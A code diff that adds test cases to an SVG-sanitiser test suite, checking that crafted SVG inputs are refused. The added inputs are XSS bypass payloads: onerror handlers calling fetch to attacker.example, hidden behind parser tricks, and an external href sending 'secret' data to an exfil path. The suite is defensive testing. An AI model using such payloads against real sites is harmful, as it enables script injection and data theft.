@@ -36,6 +36,17 @@ describe('card-safety — a design draws, and does nothing else', () => {
     expect(designRefusals(svg).join(' | ')).toContain(named);
   });
 
+  test.each([
+    ['an HTML-short comment', '<svg><!--><img src=x onerror="fetch(\'https://attacker.example\')">--></svg>'],
+    ['a greater-than sign inside a quoted attribute', '<svg><image width=">" href="#x" onerror="fetch(\'https://attacker.example\')"/></svg>', 'onerror='],
+    ['an unquoted external href', '<svg><image href=https://attacker.example/exfil?d=secret /></svg>'],
+    ['a mismatched XML close', '<svg><text>open</rect></svg>'],
+  ])('PR20 H-01: %s cannot cross the XML boundary', (_, svg, named) => {
+    const refusals = designRefusals(svg);
+    expect(refusals.length).toBeGreaterThan(0);
+    if (named) expect(refusals.join(' | ')).toContain(named);
+  });
+
   test('copy that merely reads like code is copy', () => {
     expect(designRefusals('<svg><text x="1" y="2">online = fast, onboard = easy</text></svg>')).toEqual([]);
   });
